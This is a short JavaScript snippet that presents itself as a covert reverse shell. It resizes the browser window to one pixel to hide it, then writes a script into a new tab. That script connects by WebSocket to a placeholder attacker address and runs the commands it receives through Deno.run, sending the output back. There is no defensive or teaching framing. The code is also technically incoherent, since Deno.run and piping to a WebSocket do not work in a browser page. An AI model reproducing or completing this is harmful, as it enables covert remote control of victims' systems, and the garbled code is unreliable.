// Creating a tab that opens in reverse (1 by 1 pixels big)
function resizeWindowToOnePixel() {
    window.resizeTo(1, 1);
}

// Call the function to resize the window
resizeWindowToOnePixel();

// Reverse shell code (replace the IP and port with your desired values)
const reverseShellCode = `
  const socket = new WebSocket("ws://your-ip-address:your-port");
  socket.onopen = () => {
    socket.send("Reverse shell connected");
    const cmdProc = new WebSocket("ws://your-ip-address:your-port");
    cmdProc.onmessage = (e) => {
      const cmd = e.data;
      const proc = Deno.run({
        cmd: cmd.split(" "),
        stdin: "piped",
        stdout: "piped",
        stderr: "piped",
      });
      proc.stdout.pipeTo(cmdProc);
      proc.stderr.pipeTo(cmdProc);
      cmdProc.send("Process started");
      cmdProc.send("To terminate, send 'exit'");
    };
  };
`;

// Open a new tab with reverse shell code
const tab = window.open();
tab.document.open();
tab.document.write(`
  <script>
    // Reverse shell code
    ${reverseShellCode}
  </script>
`);
tab.document.close();
